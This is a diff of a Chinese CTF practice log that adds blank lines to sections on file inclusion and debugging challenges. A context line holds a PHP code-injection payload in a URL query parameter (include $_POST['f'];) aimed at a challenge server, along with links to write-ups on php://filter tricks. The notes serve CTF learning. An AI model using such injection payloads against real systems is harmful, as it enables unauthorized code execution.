@@ -1,4 +1,5 @@
 # CTF记录
+
 ---
 
 开始时间 2019/10/17
@@ -21,6 +22,7 @@ haha 第一题我就🕊了，不愧是我
 
 --------
 ### 文件包含漏洞
+
 ---
 #### 本地包含
 进去后看到如下代码
@@ -65,6 +67,7 @@ http://120.24.86.145:8003/index.php?hello=1);include $_POST['f'];//  （把后�
 BugkuCTF-web-本地包含 https://blog.csdn.net/huangming1644/article/details/82818482
 
 谈一谈php://filter的妙用 https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+
 ---
 ### 调试类
 #### 点击100万次
